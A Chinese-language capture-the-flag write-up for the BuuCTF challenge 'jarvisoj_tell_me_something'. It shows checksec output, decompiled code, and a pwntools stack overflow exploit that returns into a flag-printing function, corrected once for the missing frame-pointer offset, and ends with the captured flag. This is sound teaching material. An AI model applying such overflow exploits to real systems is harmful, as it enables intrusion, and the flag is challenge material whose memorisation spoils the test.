---
tags:
  - BuuCTF
  - 简单
---

# jarvisoj_tell_me_something

!!!warning "这道题有坑，以后注意主函数一开始有没有 `push ebp`"

## 前置工作

先 CheckSec，看结果

```bash
┌──(ela㉿kali)-[~/Pwn]
└─$ checksec guestbook
[*] '/home/ela/Pwn/guestbook'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

然后随便运行一下，也没啥

```bash
┌──(ela㉿kali)-[~/Pwn]
└─$ ./guestbook
Input your message:
aaaa-%p-%p-%p-%p-%p-%p
I have received your message, Thank you!
```

看一看 IDA 64 怎么说

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v4; // [rsp+0h] [rbp-88h] BYREF

  write(1, "Input your message:\n", 0x14uLL);
  read(0, &v4, 0x100uLL);
  return write(1, "I have received your message, Thank you!\n", 0x29uLL);
}
```

溢出点在 `read()` 上，然后找了找，发现有个函数叫 `good_game()`，如下

```c
int good_game()
{
  FILE *v0; // rbx
  int result; // eax
  char buf[9]; // [rsp+Fh] [rbp-9h] BYREF

  v0 = fopen("flag.txt", "r");
  while ( 1 )
  {
    result = fgetc(v0);
    buf[0] = result;
    if ( (_BYTE)result == 0xFF )
      break;
    write(1, buf, 1uLL);
  }
  return result;
}
```

看上去很简单，只要我溢出到 `good_game()` 上就能获取 `flag`，地址是 `0x400620`

于是可以构建 Exp

```python
from pwn import *

p64 = lambda x: pack(x, 64)

io = remote("node4.buuoj.cn", 28354)

backdoor = 0x400620
payload = b"A" * (0x88+0x8) + p64(backdoor)

io.sendline(payload)
io.interactive()

```

结果很尴尬，运行不来，看一下主函数的汇编代码

![](https://z1.ax1x.com/2023/10/31/pinAgQH.png)

发现问题所在了，主函数开始的时候压根没有 `push ebp`，所以那个 `+0x8` 是不必要的

平常我们的主函数应该长这样

![](https://z1.ax1x.com/2023/10/31/pinEFX9.png)

所以修改 Exp，就搞定了

## 编写 Exp

```python
from pwn import *

p64 = lambda x: pack(x, 64)

io = remote("node4.buuoj.cn", 28354)

backdoor = 0x400620
payload = b"A" * 0x88 + p64(backdoor)

io.sendline(payload)
io.interactive()

```

最后获得 Flag 为 `flag{b99c254e-2950-4b4b-bdab-790d14867f45}`